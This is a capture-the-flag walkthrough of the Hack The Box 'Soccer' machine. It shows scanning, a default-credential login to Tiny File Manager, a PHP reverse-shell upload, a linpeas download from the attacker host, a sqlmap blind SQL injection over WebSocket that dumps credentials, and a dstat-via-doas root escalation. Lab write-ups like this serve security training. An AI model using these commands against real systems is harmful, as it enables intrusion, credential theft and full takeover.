# Soccer - Easy

```sh
sudo vim /etc/hosts
# add soccer.htb

nmap -T4 -p- -A -Pn -v soccer.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
    * 80/tcp - http - nginx 1.18.0
    * 9091/tcp - xmltec-xmlmail

* the webpage on port 80 is for a football club and includes some info on football; there are no other links on the website

* web scan:

    ```sh
    gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # dir scan

    gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # dir scan with medium wordlist

    ffuf -c -u "http://soccer.htb" -H "Host: FUZZ.soccer.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 178 -s
    # subdomain scan
    ```

* checking the service on port 9091 using ```nc```, it does not show any response, and if any characters/words/commands are entered, it closes the connection with "HTTP/1.1 400 Bad Request"

* checking using ```curl```:

    ```sh
    curl http://soccer.htb:9091
    # error - cannot GET /

    curl http://soccer.htb:9091 -X OPTIONS
    # this also does not work
    ```

* Googling shows that port 9091 could be running as a mail server in this case, but there are no other ways to enumerate this service for now

* ```gobuster``` directory scan shows a directory '/tiny' - this leads to a login page for H3K Tiny File Manager

* checking the page source gives the version 2.4.3

* Googling for this version gives us [CVE-2021-40964](https://www.exploit-db.com/exploits/50828) - an authenticated RCE exploit impacting Tiny File Manager versions 2.4.6 & before

* as this exploit needs valid user creds, we can check the login page and attempt default and common creds

* Googling for Tiny File Manager default creds gives us 'admin:admin@123' - attempting this works and we can login

* now we can attempt the exploit to get RCE:

    ```sh
    bash 50828.sh
    # the exploit does not run due to encoding issues
    # we need to convert it to unix format first

    dos2unix 50828.sh

    bash 50828.sh
    # creds needed

    bash 50828.sh http://soccer.htb/tiny admin 'admin@123'
    # the exploit does not work as the webroot is not found
    ```

* checking the webapp manually after logging in, we can see the file manager is using webroot ```/var/www/html```, but the webroot is writable by root user only

* checking the subfolders, we have '/tiny/uploads/' - this folder is writable and as it is a file manager, we have options to upload files as well

* we can upload a PHP reverse shell here, and once that's done, we can access it at 'http://soccer.htb/tiny/uploads/reverse-shell.php' by copying the link and this gives us RCE:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # press Enter twice

    ls -la /home
    # there is one user 'player'
    
    ls -la /var/www/html
    # check webroot files - nothing interesting

    # fetch linpeas from attacker for basic enumeration

    wget http://10.10.14.12:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-135-generic, Ubuntu 20.04.5
    * active ports include 3000 (used for proxy), 9091 (xmltec-xmlmail), 3306 (sql)
    * non-default folders '/data' & '/vagrant' found in root directory
    * a subdomain 'soc-player.soccer.htb' is mentioned

* the '/data' & '/vagrant' folders don't include any files

* continuing manual enumeration:

    ```sh
    grep --color=auto -rnwiIe "PASSW\|PASSWD\|PASSWORD\|PWD" --exclude-dir={proc,sys,dev,run} / 2>/dev/null
    # enumerate for creds

    grep --color=auto -rnwiIe "player" --exclude-dir={proc,sys,dev,run} / 2>/dev/null
    # enumerate for the username
    ```

* this gives a lot of output; but filtering through, from ```/var/log/nginx/access.log.1``` logfile, we can see the mentions of a webpage 'http://soc-player.soccer.htb/signup'

* we can check this subdomain further from the attacker - add this subdomain in ```/etc/hosts```

* on navigating to the webpage, we can see that it is similar to the webpage on port 80, but includes a few additional links for '/match', '/login' and '/signup'

* '/match' shows a list of upcoming matches; we can attempt to sign up with a test account now

* after logging in, we are redirected to an endpoint '/check' - this is for tickets to the match, and each ticket is assigned an unique ID; in this case, we have ticket ID 94572

* the input field can be used to check the validity of a given ticket ID

* checking the source code of the page shows an additional JS snippet, for the logic of the ticket check:

    ```js
    var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
    window.onload = function () {

    var btn = document.getElementById('btn');
    var input = document.getElementById('id');

    ws.onopen = function (e) {
        console.log('connected to the server')
    }
    input.addEventListener('keypress', (e) => {
        keyOne(e)
    });

    function keyOne(e) {
        e.stopPropagation();
        if (e.keyCode === 13) {
            e.preventDefault();
            sendText();
        }
    }

    function sendText() {
        var msg = input.value;
        if (msg.length > 0) {
            ws.send(JSON.stringify({
                "id": msg
            }))
        }
        else append("????????")
    }
    }

    ws.onmessage = function (e) {
    append(e.data)
    }

    function append(msg) {
    let p = document.querySelector("p");
    // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
    // p.style.color = randomColor;
    p.textContent = msg
    }
    ```

    * the page uses a WebSocket connection to the server on port 9091, and once connected, it logs a message to the browser console

    * it checks the user input on pressing Enter, and sends the input message in JSON format to the server at port 9091

    * when the server sends a message back (confirming the ticket validity), it is shown on the webpage

* we can check that the ticket validity function works as expected

* to confirm the WebSocket communication is taking place as expected, we can open the browser's developer tools, navigate to 'Network', and filter the URL by 'ws' - this shows WebSocket traffic in the 'Response' tab, where we can see JSON data like '{"id":"12345"}' is sent and the server's response is also seen

* additionally, the webpage auto-logouts the user and we need to sign up every single time as it seems to forget the user creds

* as the WebSocket communication is not checking for any characters or injection attempts, we can try using ```sqlmap``` to check for any SQLi entrypoints

* ```sqlmap``` can be used to test WebSocket communication either via the 'ws' protocol directly, or [using a middleware Python script to communicate between sqlmap and WebSocket server](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) - we can try the former in this case:

    ```sh
    sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id":"12345"}' --level 5 --risk 3 --batch --dump
    # the 'data' parameter is passed as JSON data is used
    # saves time when testing for blind SQLi
    ```

* the blind SQLi works and it identifies a non-default DB 'soccer_db', which contains the creds 'player@player.htb:PlayerOftheMatch2022'

* we can now login as 'player' via SSH:

    ```sh
    ssh player@soccer.htb

    cat user.txt
    # user flag

    sudo -l
    # not available

    # we can use linpeas.sh from earlier for basic enum
    
    cd /tmp

    ./linpeas.sh
    ```

* the findings from ```linpeas``` are similar as before, but there are a few extra findings:

    * ```doas``` binary is having SUID-bit assigned
    * under the section 'Interesting Group writable files', we can see the group 'player' can write to '/usr/local/share/dstat'

* ```doas``` is similar to ```sudo```, and can be used to run a command as another user

* Google shows that ```dstat``` is a tool for monitoring system resources in real-time

* we can check if ```doas``` allows the 'player' user to run any utility as sudo:

    ```sh
    find / -type f -name doas.conf 2>/dev/null
    # search for doas config file

    cat /usr/local/etc/doas.conf
    # 'permit nopass player as root cmd /usr/bin/dstat'
    ```

* the ```doas``` config shows that we can run ```dstat``` as sudo, so we can use the [exploit from GTFObins for dstat](https://gtfobins.github.io/gtfobins/dstat/) to get root:

    ```sh
    echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py

    # run command as root using doas
    doas -u root /usr/bin/dstat --xxx
    # this gives root shell

    cat /root/root.txt
    # root flag
    ```
